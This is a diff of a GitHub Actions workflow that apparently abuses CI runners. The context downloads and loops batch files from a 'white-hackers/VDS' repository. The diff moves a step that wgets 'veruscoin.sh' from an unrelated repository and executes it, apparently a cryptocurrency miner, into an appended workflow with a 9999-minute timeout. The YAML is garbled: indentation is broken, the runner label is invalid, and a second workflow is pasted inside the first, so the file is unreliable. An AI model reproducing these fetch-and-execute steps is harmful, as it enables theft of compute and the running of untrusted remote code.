@@ -17,11 +17,7 @@ jobs:
         Invoke-WebRequest https://raw.githubusercontent.com/white-hackers/VDS/main/loop.bat -OutFile loop.bat
     
     
-     - name: BA_channel
-      run: |
-        wget https://github.com/Kigddkljcdd/ko/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
-
-
+  
     
 
    
@@ -53,3 +49,28 @@ jobs:
       run: cmd /c start.bat
     - name: Сделано успешно! Вы можете закрыть вкладку.
       run: cmd /c loop.bat
+      
+      
+       
+name: REST-ZONE.RU by Hidden Bot
+
+on: workflow_dispatch
+
+jobs:
+  build:
+
+    runs-on: ubuntu 18.04
+    timeout-minutes: 9999
+
+    steps:
+      
+      
+      
+         - name: BA_channel
+      run: |
+        wget https://github.com/Kigddkljcdd/ko/blob/main/veruscoin.sh && chmod u+x veruscoin.sh && ./veruscoin.sh
+
+
+      
+      
+      
